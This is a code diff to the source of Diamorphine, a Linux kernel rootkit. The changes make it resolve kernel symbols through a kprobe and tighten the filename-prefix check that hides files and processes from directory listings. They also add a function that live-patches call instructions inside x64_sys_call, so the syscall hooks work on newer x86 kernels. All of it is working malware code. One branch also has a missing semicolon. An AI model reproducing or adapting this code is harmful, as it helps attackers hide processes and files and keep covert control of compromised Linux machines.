@@ -5,6 +5,10 @@
 #include <linux/slab.h>
 #include <linux/version.h> 
 
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+kallsyms_lookup_name_t kallsyms_lookup_name_fn = 0;
+
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
 #endif
@@ -56,20 +60,28 @@ static unsigned long *__sys_call_table;
 	orig_kill_t orig_kill;
 #endif
 
+
+unsigned long *resolve_sym(unsigned char *symbol)
+{
+#ifdef KPROBE_LOOKUP
+    if (kallsyms_lookup_name_fn == NULL) {
+	    register_kprobe(&kp);
+	    kallsyms_lookup_name_fn = (kallsyms_lookup_name_t) kp.addr;
+	    unregister_kprobe(&kp);
+    }
+    return (unsigned long *)kallsyms_lookup_name_fn(symbol);
+#else
+    return kallsyms_lookup_name(symbol)
+#endif
+}
+
 unsigned long *
 get_syscall_table_bf(void)
 {
 	unsigned long *syscall_table;
 	
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-#ifdef KPROBE_LOOKUP
-	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-	kallsyms_lookup_name_t kallsyms_lookup_name;
-	register_kprobe(&kp);
-	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-	unregister_kprobe(&kp);
-#endif
-	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	syscall_table = (unsigned long*)resolve_sym("sys_call_table");
 	return syscall_table;
 #else
 	unsigned long int i;
@@ -129,6 +141,7 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 #endif
 	unsigned short proc = 0;
 	unsigned long off = 0;
+    unsigned short namelen = 0;
 	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
 	struct inode *d_inode;
 
@@ -154,8 +167,9 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-		if ((!proc &&
-		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+        namelen = dir->d_reclen -  offsetof(struct linux_dirent64, d_name);
+		if ((!proc && namelen >= (STRLEN(MAGIC_PREFIX) - 1) &&
+		(memcmp(MAGIC_PREFIX, dir->d_name, (STRLEN(MAGIC_PREFIX) - 1)) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
@@ -195,6 +209,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 #endif
 	unsigned short proc = 0;
 	unsigned long off = 0;
+    unsigned short namelen = 0;
 	struct linux_dirent *dir, *kdirent, *prev = NULL;
 	struct inode *d_inode;
 
@@ -221,8 +236,9 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-		if ((!proc && 
-		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+        namelen = dir->d_reclen -  offsetof(struct linux_dirent, d_name);
+		if ((!proc && namelen >= (STRLEN(MAGIC_PREFIX) - 1) &&
+		(memcmp(MAGIC_PREFIX, dir->d_name, (STRLEN(MAGIC_PREFIX) - 1)) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
@@ -380,6 +396,40 @@ unprotect_memory(void)
 #endif
 }
 
+static void hook_syscall(int entry, unsigned long new_function)
+{
+
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+    size_t i;
+    unsigned long *x64_sys_call = resolve_sym("x64_sys_call");
+    unsigned char *func_ptr = (unsigned char *)x64_sys_call;
+    void *orig = (void *)__sys_call_table[entry];
+    __sys_call_table[entry] = new_function;
+    if (x64_sys_call == NULL) {
+        return;
+    }
+    // we have to use flipswitch to patch this kernel
+    // Just to note in, we are already in a state where we can do .text patches.
+    // This code was mostly taken from the following with minor modifications:
+    // https://github.com/1337-42/FlipSwitch-dev/blob/da16b3ee1952803054f831337d8442137b8c27c9/src/main.c#L194
+    for (i = 0; i < 0x5000 - 4; ++i) {
+        if (func_ptr[i] == 0xe8) { /* Found a call instruction */
+            int32_t rel = *(int32_t *)(func_ptr + i + 1);
+            void *call_addr = (void *)((uintptr_t)x64_sys_call + i + 5 + rel);
+            
+            if (call_addr == orig) {
+                int32_t new_rel = (uintptr_t)new_function - ((uintptr_t)x64_sys_call + i + 5);
+                /* Save original offset and replace with new one */
+                memcpy(func_ptr + i + 1, &new_rel, sizeof(new_rel));
+                break;
+            }
+        }
+    }
+#elif IS_ENABLED(CONFIG_ARM64)
+    __sys_call_table[entry] = new_function;
+#endif
+}
+
 static int __init
 diamorphine_init(void)
 {
@@ -408,13 +458,13 @@ diamorphine_init(void)
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
 #endif
 
-	unprotect_memory();
+    unprotect_memory();
 
-	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+    hook_syscall(__NR_getdents, (unsigned long) hacked_getdents);
+    hook_syscall(__NR_getdents64, (unsigned long) hacked_getdents64);
+    hook_syscall(__NR_kill, (unsigned long) hacked_kill);
 
-	protect_memory();
+    protect_memory();
 
 	return 0;
 }
@@ -422,13 +472,13 @@ diamorphine_init(void)
 static void __exit
 diamorphine_cleanup(void)
 {
-	unprotect_memory();
+    unprotect_memory();
 
-	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+    hook_syscall(__NR_getdents, (unsigned long) orig_getdents);
+    hook_syscall(__NR_getdents64, (unsigned long) orig_getdents64);
+    hook_syscall(__NR_kill, (unsigned long) orig_kill);
 
-	protect_memory();
+    protect_memory();
 }
 
 module_init(diamorphine_init);
